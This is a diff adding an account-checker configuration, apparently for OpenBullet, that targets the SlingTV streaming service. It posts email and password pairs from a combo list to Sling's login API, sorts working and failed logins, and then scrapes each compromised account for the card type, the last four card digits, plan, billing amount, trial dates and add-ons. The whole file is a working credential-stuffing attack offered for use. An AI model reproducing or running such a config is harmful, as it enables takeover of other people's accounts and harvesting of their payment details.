@@ -1,0 +1,67 @@
+[SETTINGS]
+{
+  "Name": "SlingTV",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-10T14:55:19.7081786+00:00",
+  "AdditionalInfo": "",
+  "Author": "Paparazzi-Nicolas",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#URL REQUEST POST "https://webapi-grn.p.sling.com/ums/v5/sessions?client_application=ottweb&format=json&locale=en" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Fingerprint: C-360US1G|A29079161998" 
+  HEADER "Client-Consumer-Key: x0JVBblC25ubvPGaeXbfh0QsWrySSCoAzRba6iv1" 
+  HEADER "Origin: https://www.sling.com" 
+  HEADER "Referer: https://www.sling.com/signin" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email/password combination" 
+  KEYCHAIN Success OR 
+    KEY "{\"token\":\"" 
+#Token PARSE "<SOURCE>" LR "{\"token\":\"" "\"" Recursive=FALSE -> VAR "Token" "" "" 
+#URL2 REQUEST GET "https://webapi-grn.p.sling.com/ums/v5/user/account_details?client_application=ottweb&format=json&locale=en&token=" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://www.sling.com" 
+  HEADER "X-Jwt-Authorization: Bearer <Token>" 
+  HEADER "Client-Consumer-Key: x0JVBblC25ubvPGaeXbfh0QsWrySSCoAzRba6iv1" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "X-Fingerprint: C-360US1G|A29079161998" 
+  HEADER "Referer: https://www.sling.com/account" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "account_status\":\"active" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "account_status\":\"paused" 
+#PaymentType PARSE "<SOURCE>" LR "\"card_type\":\"" "\"" Recursive=FALSE -> CAP "PaymentType" "" "" 
+#LastFour PARSE "<SOURCE>" LR "last_four\":\"" "\"" Recursive=FALSE -> CAP "LastFour" "" "" 
+#CurrentPeriod PARSE "<SOURCE>" LR "current_period_ends_at\":\"" "\"" Recursive=FALSE -> CAP "CurrentPeriod" "" "" 
+#Trial PARSE "<SOURCE>" LR "\":{\"trial_ends_at\":" "," Recursive=FALSE -> CAP "Trial" "" "" 
+#Plan PARSE "<SOURCE>" LR "plan_code\":\"" "\"" Recursive=FALSE -> CAP "Plan" "" "" 
+#Subscription PARSE "<SOURCE>" LR ",\"identifier\":\"" "\"" Recursive=TRUE -> CAP "Subscription" "" "" 
+#Amount PARSE "<SOURCE>" LR "\"amount\":" "," Recursive=TRUE -> CAP "Amount" "" "" 
+#DVR PARSE "<SOURCE>" LR "\"has_dvr\":" "," Recursive=FALSE -> CAP "DVR" "" "" 
+#HBO PARSE "<SOURCE>" LR "has_hbo\":" "," Recursive=FALSE -> CAP "HBO" "" "" 
